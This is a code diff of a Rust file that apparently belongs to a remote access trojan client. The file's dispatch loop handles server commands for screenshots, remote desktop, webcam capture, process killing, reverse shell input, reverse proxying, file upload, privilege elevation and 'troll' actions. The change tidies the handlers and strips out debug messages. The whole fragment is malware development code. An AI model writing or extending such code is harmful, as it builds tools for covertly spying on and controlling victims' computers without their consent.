@@ -1,8 +1,7 @@
-use crate::features::other::{visit_website, show_messagebox, elevate_client};
+use crate::features::other::{visit_website, show_messagebox, elevate_client, system_commands};
 use crate::features::collectors::client_info;
 use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
-use crate::features::system_commands::system_commands;
 use crate::features::fun::execute_troll_command;
 use crate::features::webcam::take_webcam;
 // use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
@@ -52,13 +51,7 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::ScreenshotDisplay(display))) => take_screenshot(display).await,
 
-            Ok(Some(ClientboundPacket::GetProcessList)) => {
-                let process_list = process_list();
-                match send_packet(ServerboundPacket::ProcessList(process_list)).await {
-                    Ok(_) => println!("Sent process list to server"),
-                    Err(e) => println!("Error sending process list: {}", e),
-                }
-            }
+            Ok(Some(ClientboundPacket::GetProcessList)) => { let _ = send_packet(ServerboundPacket::ProcessList(process_list())).await; }
 
             Ok(Some(ClientboundPacket::KillProcess(process))) => kill_process(process.pid),
 
@@ -71,7 +64,6 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::Disconnect)) => std::process::exit(0),
 
             Ok(Some(ClientboundPacket::Reconnect)) => {
-                println!("Server requested reconnection. Reconnecting...");
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
                 break 'l;
             }
@@ -110,10 +102,7 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::ShellCommand(data))) => reverse_shell_lock.send_shell_command(format!("{}\n", data).as_bytes()),
 
-            Ok(Some(ClientboundPacket::StartReverseProxy(port))) => {
-                reverse_proxy.setup(config.ip.clone(), port);
-                reverse_proxy.start().await;
-            }
+            Ok(Some(ClientboundPacket::StartReverseProxy(port))) => reverse_proxy.start(config.ip.clone(), port).await,
 
             Ok(Some(ClientboundPacket::StopReverseProxy)) => reverse_proxy.stop().await,
 
@@ -131,10 +120,7 @@ pub async fn reading_loop(
             
             Ok(Some(ClientboundPacket::UploadFile(target_folder, file_data))) => file_manager.upload_file(target_folder, file_data).await,
 
-            Ok(Some(ClientboundPacket::TrollClient(command))) => {
-                println!("Troll command received: {:?}", command);
-                execute_troll_command(&command)
-            },
+            Ok(Some(ClientboundPacket::TrollClient(command))) => execute_troll_command(&command),
 
             Ok(Some(p)) => {
                 println!("!!Unhandled packet: {:?}", p);
